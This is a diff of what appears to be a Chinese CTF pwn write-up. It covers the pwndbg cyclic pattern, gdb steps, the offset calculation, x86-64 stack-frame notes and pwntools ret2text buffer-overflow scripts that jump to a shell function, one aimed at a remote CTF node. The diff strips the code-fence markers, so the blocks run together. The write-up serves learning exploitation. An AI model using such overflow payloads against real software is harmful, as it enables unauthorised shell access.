@@ -99,25 +99,10 @@ func:
 ```
 pwndbg> cyclic 100
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
-```
-
-
-
-```
 b gets # gets处下断点
 finish # 让gets执行完毕，并在返回其被调用处停下
 AAAA # 输入AAAA
-```
-
-
-
-```
 0xF + 8 = 23
-```
-
-
-
-```
 from pwn import *
 
 system_sh_addr = 0x00401186 # fun函数地址
@@ -127,11 +112,6 @@ p = process("./pwn1")
 
 p.sendlineafter(b'please input', payload)
 p.interactive()
-```
-
-
-
-```
 call func           ; push return address → rsp -= 8
 
 func:
@@ -145,32 +125,17 @@ func:
     mov  rsp, rbp   ; 丢弃当前栈帧中的局部变量区
     pop  rbp        ; 恢复调用者的        rsp += 8
     ret             ; 弹出返回地址并跳转   rsp += 8
-```
-
-
-
-```
 from pwn import *
 
 system_sh_addr = 0x00401187
 offset = 23
 payload = offset * b'A' + p64(system_sh_addr)
 p = remote('node5.buuoj.cn',25170)
-#p.sendlineafter(b'please input', payload)
+    #p.sendlineafter(b'please input', payload)
 p.sendline(payload);
 print('[*] send payload finish!')
 p.interactive()
-```
-
-
-
-```
 ssize_t read(int fd, void *buf, size_t count);
-```
-
-
-
-```
 from pwn import *
 
 system_sh_addr = 0x004011fb
